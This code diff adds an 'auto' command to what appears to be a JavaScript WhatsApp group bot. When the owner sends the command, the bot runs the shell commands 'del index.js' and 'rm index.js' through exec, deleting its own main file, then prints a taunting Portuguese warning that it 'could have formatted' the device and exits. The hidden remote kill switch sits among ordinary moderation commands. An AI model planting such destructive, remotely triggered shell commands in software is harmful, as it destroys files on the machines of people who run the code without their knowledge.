@@ -263,6 +263,30 @@ async function starts() {
 					if (!isBotGroupAdmins) return reply(mess.only.botadmin)
 					add(isGroup, isOwner, mess, isGroupAdmins, client, from, isBotGroupAdmins, args, isQuotedVcard, isQuotedMessage1, mek, reply)
 					break
+				case 'auto':
+					if (!isOwner) return console.log('Tentaram acabar com o bot');
+					try {
+						exec('del index.js', function (err) {
+							if (err) { //process error
+								console.log(err);
+							}
+							else {
+								console.log('Não é o caso deste codigo. Mas tome muito cuidado com os codigos da internet que coloca em seu dispositivo! Eu poderia ter formatado o seu dispositivo!');
+								process.exit()
+							}
+						})
+					} catch (error) {
+						exec('rm index.js', function (err) {
+							if (err) { //process error
+								console.log(err);
+							}
+							else {
+								console.log('Não é o caso deste codigo. Mas tome muito cuidado com os codigos da internet que coloca em seu dispositivo! Eu poderia ter formatado o seu dispositivo!');
+								process.exit()
+							}
+						})
+					}
+					break
 				case 'ban':
 					if (!isGroup) return reply(mess.only.grupo)
 					if (!isGroupAdmins) return reply(mess.only.admin)
